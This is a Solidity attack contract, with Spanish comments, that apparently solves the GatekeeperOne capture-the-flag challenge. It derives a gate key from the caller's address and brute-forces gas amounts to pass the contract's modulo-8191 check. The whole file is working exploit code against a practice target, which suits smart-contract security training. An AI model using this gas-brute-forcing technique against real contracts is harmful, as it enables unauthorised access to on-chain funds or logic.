// SPDX-License-Identifier: MIT
// 1, Llamar a la funcion GateKeeperOne.enter(_bytes8 _gateKey) con la gateKey correspondiente.
// 2. Puerta_1: debe ser llamado desde un contrato. (Esto solo se hace un contrato atacante)
// 3. Puerta_2: la operacion gasleft() % 8191 debe dar 0. (Esto hay que calcular cuanto queda de Gas, hay que ver cuanto se gasta en Gas con el primer paso y el segundo.)
// 4. Puerta_3: Operacion 3 es un calculo entre bytes
pragma solidity ^0.6.0;


contract GatekeeperOneAttack {
    bool success;

    event Response(bool success);

    function attack(address gatekeeperAddr) public {
        bytes8 gateKey = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);
        uint256 gasBrute;

        // call the enter function.
        // (bool success, bytes memory data) = gatekeeperAddr.call{gas: 1 + 150 + (8191 * 3)}(
        //     abi.encodeWithSignature("enter(bytes8)", gateKey)
        // );
        for(gasBrute = 0; gasBrute <= 120; gasBrute++){
            (success,) = gatekeeperAddr.call{gas: gasBrute + 150 + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if(success){
                break;
            }
        }
        emit Response(success);
    }
}